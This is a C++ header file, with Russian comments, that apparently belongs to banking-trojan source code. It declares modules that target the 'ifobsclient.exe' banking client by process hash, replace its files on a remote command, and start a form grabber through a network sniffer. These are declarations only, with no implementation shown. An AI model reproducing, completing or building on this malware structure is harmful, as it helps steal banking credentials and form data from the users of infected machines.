#pragma once
//различные системы

#include "core\core.h"
#include "config.h"

namespace System
{

//hash - хеш процесса (nameProcess), nameProcess - имя процесса, path - папка где находится nameProcess
void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path );

}

#ifdef ON_IFOBS

namespace IFobs
{

const int HASH_PROCESS = 0x0fcd41c5; // ifobsclient.exe
extern char* nameProcess;

void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path );
//вызывается по команде ifobs (task.cpp)
void CreateFileReplacing( StringBuilder& s );

}

#endif

#ifdef ON_FORMGRABBER

namespace FormGrabber
{

void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path );
//запуск форм граббера через сниффер
void StartCrossSniffer();

}

#endif
